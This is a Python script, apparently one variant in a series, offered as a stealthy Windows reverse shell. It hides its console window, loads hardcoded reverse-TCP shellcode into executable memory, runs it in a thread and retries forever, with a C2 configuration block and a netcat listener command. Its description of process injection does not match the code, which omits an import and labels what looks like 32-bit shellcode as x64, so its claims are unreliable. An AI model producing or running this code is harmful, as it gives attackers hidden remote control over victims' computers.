'''Variant 4 – Reflective shell via WinAPI (no subprocess.exe visible)
Main differences

Does not spawn cmd.exe or powershell.exe as a child process
Uses CreateProcess with suspended thread + WriteProcessMemory to inject shellcode that connects back (more stealthy process tree)
Shellcode is tiny reverse TCP stager (x64) — connects and spawns cmd inside the injected process
No file drops after initial execution'''

# SophiaReflectiveReverseShell.py - Variant 4 (full reflective shellcode)
# Runs entirely in-memory, no visible cmd.exe child process
# Listener: nc -lvp 4444

import ctypes
import sys
import time
import socket  # only for optional error checking

kernel32 = ctypes.windll.kernel32
user32   = ctypes.windll.user32

# ──────────────────────────────────────────────
#          CONFIGURE YOUR C2 HERE
# ──────────────────────────────────────────────
LHOST = "127.0.0.1"     # your IP
LPORT = 4444            # your listening port
# ──────────────────────────────────────────────

# windows/x64/shell_reverse_tcp shellcode (~330-350 bytes)
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f python
# This is a representative version — patch the IP/port bytes below if needed
shellcode = bytearray(
    b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
    b"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
    b"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
    b"\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48"
    b"\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b"
    b"\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"
    b"\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3"
    b"\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89"
    b"\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b"
    b"\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54"
    b"\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54"
    b"\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68" + 
    # LHOST in little-endian bytes (4 bytes)  ← REPLACE THESE
    (socket.inet_aton(LHOST)[::-1]) +  
    b"\x68\x02\x00" +
    # LPORT in network byte order (big-endian) htons(LPORT)
    struct.pack("!H", LPORT) +
    b"\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x56\x50\x68\xea\x0f"
    b"\xdf\xe0\xff\xd5\x97\x6a\x05\x56\x57\x68\x99\xa5\x74\x61\xff"
    b"\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\xe8\x67\x00\x00\x00"
    b"\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8"
    b"\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00"
    b"\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68"
    b"\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x22\x58\x68\x00\x40"
    b"\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68\x75"
    b"\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff"
    b"\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0"
    b"\xb5\xa2\x56\x6a\x00\x53\xff\xd5"
)

# Patch IP and PORT if you didn't use the struct.pack above
# shellcode[ ... ] = ...  # manual hex edit if preferred

def hide_console():
    try:
        user32.ShowWindow(kernel32.GetConsoleWindow(), 0)
    except:
        pass

def reflective_execute():
    PAGE_EXECUTE_READWRITE = 0x40
    MEM_COMMIT             = 0x1000

    # Allocate memory in current process
    mem = kernel32.VirtualAlloc(
        ctypes.c_int(0),
        ctypes.c_size_t(len(shellcode)),
        ctypes.c_int(MEM_COMMIT),
        ctypes.c_int(PAGE_EXECUTE_READWRITE)
    )

    if not mem:
        return False

    # Copy shellcode into allocated memory
    buf = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)
    ctypes.memmove(mem, buf, len(shellcode))

    # Create thread to execute shellcode
    thread_id = ctypes.c_ulong(0)
    handle = kernel32.CreateThread(
        ctypes.c_int(0),
        ctypes.c_size_t(0),
        ctypes.c_void_p(mem),
        ctypes.c_int(0),
        ctypes.c_ulong(0),
        ctypes.pointer(thread_id)
    )

    if not handle:
        kernel32.VirtualFree(mem, 0, 0x8000)  # MEM_RELEASE
        return False

    # Wait forever — shellcode handles the rest
    kernel32.WaitForSingleObject(handle, 0xFFFFFFFF)
    return True

def main():
    hide_console()

    while True:
        try:
            if reflective_execute():
                # If shellcode returns (rare), retry
                pass
        except:
            pass

        time.sleep(5)  # retry delay

if __name__ == "__main__":
    main()